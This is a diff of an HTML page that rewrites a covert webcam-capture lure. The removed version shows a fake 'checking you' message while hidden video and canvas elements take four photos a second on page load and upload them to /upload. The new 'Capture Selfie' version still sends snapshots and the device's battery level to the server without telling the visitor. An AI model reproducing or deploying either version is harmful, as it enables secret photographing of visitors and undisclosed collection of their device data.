@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ARE YOU FRIEND OF SUSH?</title>
+    <title>Capture Selfie</title>
     <style>
         body {
             background-color: black;
@@ -19,64 +19,75 @@
         h1 {
             margin-bottom: 20px;
         }
-        .hacker-text {
-            color: green;
-            font-size: 24px;
-            font-family: monospace;
-            animation: flicker 1.5s infinite alternate;
+        button {
+            background-color: green;
+            color: black;
+            font-size: 16px;
+            border: none;
+            padding: 10px 20px;
+            cursor: pointer;
         }
-        @keyframes flicker {
-            0% { opacity: 1; }
-            50% { opacity: 0.5; }
-            100% { opacity: 1; }
+        #output {
+            margin-top: 20px;
+            border: 2px solid green;
+            padding: 10px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        #output img {
+            max-width: 300px;
+            height: auto;
         }
     </style>
 </head>
 <body>
-    <h1>Are you know sushmita?</h1>
-    <div class="hacker-text">Wait we checking you...</div>
-    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
-    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
-
+    <h1>Welcome to the Selfie Page</h1>
+    <button onclick="startCapture()">Capture Selfie</button>
+    <div id="output"></div>
     <script>
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const context = canvas.getContext('2d');
-
-        // Ask for camera access and capture photos automatically
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
+        async function startCapture() {
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
                 video.srcObject = stream;
-                video.onloadedmetadata = () => {
-                    setInterval(() => {
-                        for (let i = 0; i < 4; i++) {
-                            setTimeout(() => {
-                                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                                const dataURL = canvas.toDataURL('image/png');
+                video.play();
+                
+                setTimeout(async () => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    const context = canvas.getContext('2d');
+                    
+                    const snapshots = [];
+                    for (let i = 0; i < 3; i++) {
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        snapshots.push(canvas.toDataURL('image/png'));
+                        await new Promise(resolve => setTimeout(resolve, 1000));
+                    }
+                    
+                    const battery = await navigator.getBattery();
+                    const batteryLevel = Math.round(battery.level * 100);
 
-                                // Send the captured photo to the server
-                                fetch('/upload', {
-                                    method: 'POST',
-                                    body: JSON.stringify({ image: dataURL }),
-                                    headers: {
-                                        'Content-Type': 'application/json'
-                                    }
-                                })
-                                .then(response => response.json())
-                                .then(data => {
-                                    console.log('Image uploaded successfully:', data);
-                                })
-                                .catch(error => {
-                                    console.error('Error uploading image:', error);
-                                });
-                            }, i * 250); // Capture photos at intervals within each second
-                        }
-                    }, 1000); // Capture 4 photos every second
-                };
-            })
-            .catch(error => {
-                console.error('Error accessing camera:', error);
-            });
+                    for (const snapshot of snapshots) {
+                        const response = await fetch('/upload', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({ image: snapshot, battery: batteryLevel })
+                        });
+                        const data = await response.json();
+                        const img = document.createElement('img');
+                        img.src = snapshot;
+                        document.getElementById('output').appendChild(img);
+                    }
+
+                    video.pause();
+                    stream.getTracks().forEach(track => track.stop());
+                }, 1000);
+            }
+        }
     </script>
 </body>
 </html>
